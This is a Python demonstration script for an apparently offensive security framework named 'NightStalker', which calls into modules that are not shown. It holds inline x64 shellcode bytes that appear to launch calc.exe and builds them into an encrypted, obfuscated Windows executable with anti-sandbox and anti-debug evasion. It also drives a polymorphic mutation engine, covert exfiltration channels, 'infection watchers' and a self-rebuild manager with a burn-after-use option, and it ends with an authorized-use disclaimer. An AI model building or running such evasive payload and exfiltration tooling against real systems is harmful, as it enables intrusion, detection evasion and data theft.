#!/usr/bin/env python3
"""
NightStalker Framework Demonstration
Showcases the advanced offensive security framework capabilities
"""

import sys
import time
import json
from pathlib import Path

def print_banner():
    """Print the NightStalker banner"""
    banner = """
    ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ ██╗      ██████╗ ██╗  ██╗███████╗██████╗ 
    ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗██║     ██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
    ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██████╔╝██║     ██║   ██║█████╔╝ █████╗  ██████╔╝
    ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║     ██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║███████╗╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    
    Advanced Offensive Security Framework
    =====================================
    """
    print(banner)

def demo_payload_builder():
    """Demonstrate payload builder functionality"""
    print("\n🔧 Payload Builder Demonstration")
    print("=" * 40)
    
    try:
        from nightstalker.redteam.payload_builder import PayloadBuilder, PayloadConfig
        
        print("Creating payload builder...")
        builder = PayloadBuilder()
        
        # Create a simple shellcode
        shellcode = b'\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x63\x61\x6c\x63\x2e\x65\x78\x65\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4'
        
        print(f"Base shellcode size: {len(shellcode)} bytes")
        
        # Create payload configuration
        config = PayloadConfig(
            os_type="windows",
            format_type="exe",
            encryption=True,
            obfuscation=True,
            anti_sandbox=True,
            anti_debug=True
        )
        
        print("Building polymorphic payload...")
        payload_path = builder.build_payload("custom", shellcode, config)
        
        print(f"✓ Payload built successfully: {payload_path}")
        
        # Get payload info
        payload_info = builder.get_payload_info(payload_path)
        print(f"  - File size: {payload_info.get('file_size', 0)} bytes")
        print(f"  - File hash: {payload_info.get('file_hash', 'N/A')}")
        print(f"  - File type: {payload_info.get('file_type', 'N/A')}")
        
        return True
        
    except Exception as e:
        print(f"✗ Payload builder demo failed: {e}")
        return False

def demo_genetic_fuzzer():
    """Demonstrate genetic fuzzer functionality"""
    print("\n🧬 Genetic Fuzzer Demonstration")
    print("=" * 40)
    
    try:
        from nightstalker.core.fuzzer import GeneticFuzzer
        
        print("Initializing genetic fuzzer...")
        fuzzer = GeneticFuzzer()
        
        print(f"Population size: {fuzzer.population_size}")
        print(f"Mutation rate: {fuzzer.mutation_rate}")
        print(f"Generation limit: {fuzzer.generation_limit}")
        
        # Show initial population statistics
        stats = fuzzer.get_payload_statistics()
        print(f"Initial population statistics:")
        print(f"  - Average anomaly score: {stats.get('avg_anomaly_score', 0):.4f}")
        print(f"  - Maximum anomaly score: {stats.get('max_anomaly_score', 0):.4f}")
        
        # Run a short fuzzing session
        print("Running genetic fuzzing (5 generations)...")
        results = fuzzer.run_fuzzing(generations=5)
        
        print(f"✓ Fuzzing completed:")
        print(f"  - Total payloads tested: {results.get('total_payloads_tested', 0)}")
        print(f"  - Anomalies found: {results.get('anomalies_found', 0)}")
        print(f"  - Best payloads: {len(results.get('best_payloads', []))}")
        
        return True
        
    except Exception as e:
        print(f"✗ Genetic fuzzer demo failed: {e}")
        return False

def demo_attack_chain():
    """Demonstrate attack chain functionality"""
    print("\n⚔️  Attack Chain Demonstration")
    print("=" * 40)
    
    try:
        from nightstalker.core.automation import AttackChain
        
        print("Initializing attack chain...")
        chain = AttackChain()
        
        print(f"Available phases: {list(chain.phases.keys())}")
        
        # Show phase status
        status = chain.get_phase_status()
        print("Phase status:")
        for phase, state in status.items():
            print(f"  - {phase}: {state}")
        
        # Show configuration
        print(f"Configuration loaded from: {chain.config_path}")
        
        print("✓ Attack chain initialized successfully")
        return True
        
    except Exception as e:
        print(f"✗ Attack chain demo failed: {e}")
        return False

def demo_exfiltration():
    """Demonstrate exfiltration functionality"""
    print("\n📡 Covert Exfiltration Demonstration")
    print("=" * 40)
    
    try:
        from nightstalker.core.exfiltration import CovertChannels
        
        print("Initializing covert channels...")
        exfil = CovertChannels()
        
        print("Available channels:")
        for channel_id, channel in exfil.channels.items():
            status = "✓" if channel.enabled else "✗"
            print(f"  {status} {channel.name} (Priority: {channel.priority})")
        
        # Show exfiltration statistics
        stats = exfil.get_exfiltration_stats()
        if stats:
            print(f"Exfiltration statistics:")
            print(f"  - Total attempts: {stats.get('total_attempts', 0)}")
            print(f"  - Successful attempts: {stats.get('successful_attempts', 0)}")
            print(f"  - Overall success rate: {stats.get('overall_success_rate', 0):.2%}")
        
        print("✓ Covert channels initialized successfully")
        return True
        
    except Exception as e:
        print(f"✗ Exfiltration demo failed: {e}")
        return False

def demo_file_monitor():
    """Demonstrate file monitoring functionality"""
    print("\n👁️  File Monitoring Demonstration")
    print("=" * 40)
    
    try:
        from nightstalker.core.infection_watchers import FileMonitor
        
        print("Initializing file monitor...")
        monitor = FileMonitor()
        
        print(f"Available triggers: {len(monitor.triggers)}")
        for trigger_name, trigger in monitor.triggers.items():
            status = "✓" if trigger.enabled else "✗"
            print(f"  {status} {trigger.name} ({trigger.trigger_type})")
        
        # Show trigger statistics
        stats = monitor.get_trigger_stats()
        if stats:
            print(f"Trigger statistics:")
            print(f"  - Total events: {stats.get('total_events', 0)}")
            print(f"  - Successful executions: {stats.get('successful_executions', 0)}")
            print(f"  - Overall success rate: {stats.get('overall_success_rate', 0):.2%}")
        
        print("✓ File monitor initialized successfully")
        return True
        
    except Exception as e:
        print(f"✗ File monitor demo failed: {e}")
        return False

def demo_environment_manager():
    """Demonstrate environment manager functionality"""
    print("\n🏗️  Environment Manager Demonstration")
    print("=" * 40)
    
    try:
        from nightstalker.core.self_rebuild import EnvironmentManager, EnvironmentConfig
        
        print("Initializing environment manager...")
        config = EnvironmentConfig(
            portable_mode=False,
            burn_after_use=False,
            mirror_mode=False
        )
        env_manager = EnvironmentManager(config)
        
        # Show environment status
        status = env_manager.get_environment_status()
        print("Environment status:")
        for key, value in status.items():
            if isinstance(value, bool):
                status_icon = "✓" if value else "✗"
                print(f"  {status_icon} {key}: {value}")
            else:
                print(f"  - {key}: {value}")
        
        print("✓ Environment manager initialized successfully")
        return True
        
    except Exception as e:
        print(f"✗ Environment manager demo failed: {e}")
        return False

def demo_polymorphic_engine():
    """Demonstrate polymorphic engine functionality"""
    print("\n🔄 Polymorphic Engine Demonstration")
    print("=" * 40)
    
    try:
        from nightstalker.redteam.polymorph import PolymorphicEngine
        
        print("Initializing polymorphic engine...")
        engine = PolymorphicEngine()
        
        print(f"Available mutation rules: {len(engine.mutation_rules)}")
        for rule_name, rule in engine.mutation_rules.items():
            status = "✓" if rule.enabled else "✗"
            print(f"  {status} {rule.name}: {rule.description}")
        
        # Create a demo payload
        demo_payload = b"demo_payload_for_evolution"
        print(f"Demo payload size: {len(demo_payload)} bytes")
        
        # Run evolution
        print("Running polymorphic evolution (3 generations)...")
        best_variant = engine.run_evolution(demo_payload, generations=3)
        
        print(f"✓ Evolution completed:")
        print(f"  - Best fitness: {best_variant.fitness_score:.4f}")
        print(f"  - Mutations applied: {best_variant.mutation_history}")
        print(f"  - Final size: {len(best_variant.data)} bytes")
        
        return True
        
    except Exception as e:
        print(f"✗ Polymorphic engine demo failed: {e}")
        return False

def run_demo():
    """Run the complete demonstration"""
    print_banner()
    
    print("🚀 Starting NightStalker Framework Demonstration")
    print("=" * 60)
    
    demos = [
        ("Payload Builder", demo_payload_builder),
        ("Genetic Fuzzer", demo_genetic_fuzzer),
        ("Attack Chain", demo_attack_chain),
        ("Covert Exfiltration", demo_exfiltration),
        ("File Monitoring", demo_file_monitor),
        ("Environment Manager", demo_environment_manager),
        ("Polymorphic Engine", demo_polymorphic_engine)
    ]
    
    successful_demos = 0
    total_demos = len(demos)
    
    for demo_name, demo_func in demos:
        print(f"\n{'='*60}")
        print(f"Running: {demo_name}")
        print(f"{'='*60}")
        
        try:
            if demo_func():
                successful_demos += 1
                print(f"✓ {demo_name} completed successfully")
            else:
                print(f"✗ {demo_name} failed")
        except Exception as e:
            print(f"✗ {demo_name} error: {e}")
        
        time.sleep(1)  # Brief pause between demos
    
    # Summary
    print(f"\n{'='*60}")
    print("DEMONSTRATION SUMMARY")
    print(f"{'='*60}")
    print(f"Successful demonstrations: {successful_demos}/{total_demos}")
    print(f"Success rate: {(successful_demos/total_demos)*100:.1f}%")
    
    if successful_demos == total_demos:
        print("\n🎉 All demonstrations completed successfully!")
        print("NightStalker framework is ready for advanced offensive security operations.")
    else:
        print(f"\n⚠️  {total_demos - successful_demos} demonstration(s) failed.")
        print("Please check the installation and dependencies.")
    
    print(f"\n{'='*60}")
    print("IMPORTANT: This framework is for authorized security research only!")
    print("Use responsibly and in compliance with applicable laws and regulations.")
    print(f"{'='*60}")

if __name__ == "__main__":
    run_demo() 